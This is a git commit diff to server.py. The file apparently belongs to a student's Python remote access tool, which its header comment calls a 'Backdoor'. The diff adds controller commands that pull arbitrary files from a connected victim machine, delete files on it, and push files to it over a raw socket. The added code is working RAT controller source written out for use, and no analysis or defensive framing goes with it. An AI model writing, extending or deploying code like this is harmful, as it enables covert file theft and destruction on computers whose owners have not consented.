2c992774bedef223a047df906a179d6b7837167f
Stoney290 <61219282+Stoney290@users.noreply.github.com>
2020-08-11 13:31:43 +0530

    Update server.py

--- server.py
+++ server.py
@@ -1,16 +1,18 @@
-# Meet👻(17IT064) * Access files remotely (RAT)
+# Meet👻(17IT064) * Access files remotely (Backdoor)
 
-# Gain access to different directories
+# $=working
 
-# View Files
+# $ Gain access to different directories
 
-# Download Files
+# $ View Files
 
-# Remove Files
+# $ Download Files
 
-# Remove Directories
+# $ Remove Files
 
-# Send Files
+# $ Remove Directories
+
+# $ Send Files
 
 # Create Directory
 
@@ -35,7 +37,7 @@ print(addr, "Has connected to the server successfully")
 
 while 1:
     command = input (str("Command >> "))
-    if command == "view cwd":
+    if command == "view_cwd":
         conn.send (command.encode () )
         print ("")
         print ("Command sent waiting for execution... ")
@@ -57,6 +59,38 @@ while 1:
             files = conn.recv (5000)
             files = files.decode ()
             print ("Custom Dir Result : ", files)
+
+    elif command == "download_file":
+            conn.send (command.encode())
+            filepath = input (str("Please enter the file path including the file name.."))
+            conn.send (filepath.encode())
+            file = conn.recv (100000)
+            print ("")
+            filename = input (str ("Please enter a filename for the incoming file including extension"))
+            new_file = open(filename, "wb")
+            new_file.write (file)
+            new_file.close()
+            print ("")
+            print (filename, " Has been downloaded and saved ")
+            print ("")
+
+    elif command == "remove_file":
+            conn.send (command.encode () )
+            fileanddir = input (str("Please enter the filename and directory :"))
+            conn.send (fileanddir.encode ())
+            print ("")
+            print (" Command has been executed successfully : File Removed")
+            print ("")
+
+    elif command == "send_files":
+            conn.send (command.encode ())
+            file = input(str("Please enter the filename and directory of the file"))
+            filename = input(str("please enter the filename for the file being sent"))
+            data = open(file, "rb")
+            file_data = data.read (7000)
+            conn.send(filename.encode ())
+            print(file, "Has been sent successfully")
+            conn.send(file_data)
 
     else:
         print ("")
